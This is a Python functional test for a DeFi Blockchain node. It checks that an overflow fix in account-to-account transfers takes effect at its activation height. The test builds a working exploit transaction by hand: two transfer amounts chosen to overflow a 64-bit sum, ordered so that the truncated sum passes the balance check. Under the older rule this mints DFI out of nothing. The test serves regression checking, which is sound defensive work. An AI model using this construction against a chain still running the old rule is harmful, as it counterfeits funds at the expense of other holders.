#!/usr/bin/env python3
# Copyright (c) 2026 The DeFi Blockchain Developers
# Distributed under the MIT software license, see the accompanying
# file LICENSE or http://www.opensource.org/licenses/mit-license.php.
"""Test the balance overflow activation height.

The strict rule (an overflowing sum of transfer amounts is rejected) is
active from consensus.nBalanceOverflowHeight on. Below that height the
historical behaviour is kept: the overflow error is swallowed and the sum
stays truncated, so the source account is debited with the truncated sum
while the destinations are credited with their full amounts.

This test covers both sides of the activation height:

  * node 0 has the activation height at 1 - the strict rule always
    applies and the transaction is rejected,
  * node 1 has the activation height at 250 - below that height the
    historical behaviour applies and the transaction is accepted (the
    destinations are credited with their full amounts while the source
    is debited with the truncated sum), from that height on the
    transaction is rejected again.

The two nodes run different consensus rules, so they are deliberately NOT
connected - they would immediately diverge.

The transaction has to be built raw: ParseFixedPoint() rejects amounts with
more than 18 significant digits, so the exploit amount cannot be expressed
through the RPC interface.
"""

import struct
from decimal import Decimal

from test_framework.test_framework import DefiTestFramework
from test_framework.util import assert_equal, assert_raises_rpc_error

COIN = 100000000
INT64_MAX = 2**63 - 1

# Amounts used by the attack: 8.00000001 DFI and INT64_MAX - 8 DFI.
SMALL = 800000001
BIG = INT64_MAX - 800000000

# The initial chain has 199 blocks, so the activation height has to be
# above that to have a legacy phase.
ACTIVATION_HEIGHT = 250

# All softforks at height 1, otherwise accounttoaccount is rejected with
# "called before AMK height".
SOFTFORKS = [
    "-amkheight=1",
    "-bayfrontheight=1",
    "-bayfrontmarinaheight=1",
    "-bayfrontgardensheight=1",
    "-clarkequayheight=1",
    "-dakotaheight=1",
    "-dakotacrescentheight=1",
    "-eunosheight=1",
    "-eunospayaheight=1",
    "-fortcanningheight=1",
    "-fortcanningmuseumheight=1",
    "-fortcanningparkheight=1",
    "-fortcanninghillheight=1",
    "-fortcanningroadheight=1",
    "-fortcanningcrunchheight=1",
    "-fortcanningspringheight=1",
    "-fortcanninggreatworldheight=1",
    "-fortcanningepilogueheight=1",
    "-grandcentralheight=1",
    "-grandcentralepilogueheight=1",
    "-metachainheight=1",
    "-df23height=1",
    "-df24height=1",
]


def varint(n):
    """Bitcoin variable length integer."""
    if n < 0xFD:
        return bytes([n])
    if n <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", n)
    if n <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)


def build_dftx_payload(from_script, to_entries):
    """AccountToAccountMessage: from (CScript) + to (CAccounts)."""
    out = b"DfTx" + bytes([0x42])  # 0x42 == 'B' == AccountToAccount
    out += varint(len(from_script)) + from_script
    out += varint(len(to_entries))
    for script, amounts in to_entries:
        out += varint(len(script)) + script
        out += varint(len(amounts))
        for token_id, amount in amounts:
            out += struct.pack("<I", token_id) + struct.pack("<q", amount)
    return out


def build_raw_tx(inputs, outputs, locktime=0):
    """Serialize a witness transaction (version 4)."""
    raw = struct.pack("<i", 4)
    raw += varint(len(inputs))
    for idx, (txid, vout, sequence) in enumerate(inputs):
        raw += txid[::-1] + struct.pack("<I", vout)
        if idx == 0:
            marker = b"\x00\x01"  # segwit marker + flag
            raw += varint(len(marker)) + marker
        else:
            raw += varint(0)
        raw += struct.pack("<I", sequence)
    raw += varint(len(outputs))
    for satoshi, script in outputs:
        raw += struct.pack("<q", satoshi) + varint(len(script)) + script
    raw += struct.pack("<I", locktime)
    return raw


class BalanceOverflowActivationTest(DefiTestFramework):
    def set_test_params(self):
        self.num_nodes = 2
        # Node 0: the strict rule is active from height 1.
        # Node 1: the strict rule only becomes active at ACTIVATION_HEIGHT.
        self.extra_args = [
            SOFTFORKS + ["-balanceoverflowheight=1"],
            SOFTFORKS + [f"-balanceoverflowheight={ACTIVATION_HEIGHT}"],
        ]

    def setup_network(self):
        # The two nodes run different consensus rules and would diverge
        # immediately - so they are not connected.
        self.setup_nodes()

    def skip_test_if_missing_module(self):
        self.skip_if_no_wallet()

    def p2wpkh_script(self, node, address):
        """Return the P2WPKH script of an address."""
        script = bytes.fromhex(node.getaddressinfo(address)["scriptPubKey"])
        assert len(script) == 22 and script[0] == 0x00 and script[1] == 0x14
        return script

    def account_balance(self, node, address):
        """Account balance (not utxo balance) of an address in DFI."""
        for entry in node.listaccounts():
            owner = entry.get("owner") or {}
            if address in (owner.get("addresses") or []):
                raw = entry.get("amount") or ""
                if raw.endswith("@DFI"):
                    return Decimal(raw.split("@")[0])
        return Decimal(0)

    def prepare_attacker(self, node):
        """
        Sets up the source account and returns everything needed to build
        the attack transaction.
        """
        attacker = node.getnewaddress("", "bech32")
        recv_a = node.getnewaddress("", "bech32")
        recv_b = node.getnewaddress("", "bech32")

        script_attacker = self.p2wpkh_script(node, attacker)
        script_a = self.p2wpkh_script(node, recv_a)
        script_b = self.p2wpkh_script(node, recv_b)

        # CAccounts is a std::map<CScript, CBalances>: the iteration follows
        # the script bytes. The smaller script has to carry the smaller
        # amount, otherwise the truncated sum is too big to pass the balance
        # check.
        if script_a <= script_b:
            small_script, small_addr = script_a, recv_a
            big_script, big_addr = script_b, recv_b
        else:
            small_script, small_addr = script_b, recv_b
            big_script, big_addr = script_a, recv_a

        node.utxostoaccount({attacker: "8.00000001"})
        node.generate(1)
        node.sendtoaddress(attacker, 20)
        node.generate(1)

        utxo = None
        for u in node.listunspent():
            if u.get("address") == attacker:
                utxo = u
                break
        assert utxo is not None, "no utxo for the attacker address"
        in_amount = int(round(float(utxo["amount"]) * COIN))

        payload = build_dftx_payload(
            script_attacker,
            [
                (small_script, [(0, SMALL)]),
                (big_script, [(0, BIG)]),
            ],
        )
        assert SMALL + BIG == INT64_MAX + 1, "sum must exceed INT64_MAX"
        op_return = b"\x6a\x4c" + bytes([len(payload)]) + payload

        raw = build_raw_tx(
            [(bytes.fromhex(utxo["txid"]), utxo["vout"], 0xFFFFFFFF)],
            [
                (0, op_return),
                (in_amount - 10000, script_attacker),
            ],
        )
        signed = node.signrawtransactionwithwallet(raw.hex())
        assert signed.get("complete"), f"signing failed: {signed}"

        return {
            "signed": signed["hex"],
            "attacker": attacker,
            "small_addr": small_addr,
            "big_addr": big_addr,
        }

    def run_test(self):
        strict = self.nodes[0]
        legacy = self.nodes[1]

        # --- the strict rule (activation height 1) --------------------------
        info = self.prepare_attacker(strict)
        assert_raises_rpc_error(
            -26, "overflow", strict.sendrawtransaction, info["signed"]
        )
        # No DFI may have been created.
        assert_equal(self.account_balance(strict, info["big_addr"]), Decimal(0))
        assert_equal(self.account_balance(strict, info["small_addr"]), Decimal(0))

        # --- the legacy behaviour (activation height 250) -------------------
        # The chain is at height 201 here, so the historical behaviour
        # applies: the overflow error is swallowed, the sum stays truncated
        # at the first amount and the transaction is accepted.
        assert legacy.getblockcount() < ACTIVATION_HEIGHT, "must be below the activation height"

        info = self.prepare_attacker(legacy)
        txid = legacy.sendrawtransaction(info["signed"])
        assert txid, "the transaction must be accepted below the activation height"
        legacy.generate(1)

        # The historical behaviour debits the source with the truncated sum
        # (8.00000001 DFI) and credits the destinations with their full
        # amounts.
        assert_equal(
            self.account_balance(legacy, info["small_addr"]),
            Decimal(SMALL) / COIN,
        )
        assert_equal(
            self.account_balance(legacy, info["big_addr"]),
            Decimal(BIG) / COIN,
        )

        # --- from the activation height on the strict rule applies again ----
        legacy.generate(ACTIVATION_HEIGHT)
        assert legacy.getblockcount() >= ACTIVATION_HEIGHT
        info = self.prepare_attacker(legacy)
        assert_raises_rpc_error(
            -26, "overflow", legacy.sendrawtransaction, info["signed"]
        )


if __name__ == "__main__":
    BalanceOverflowActivationTest().main()
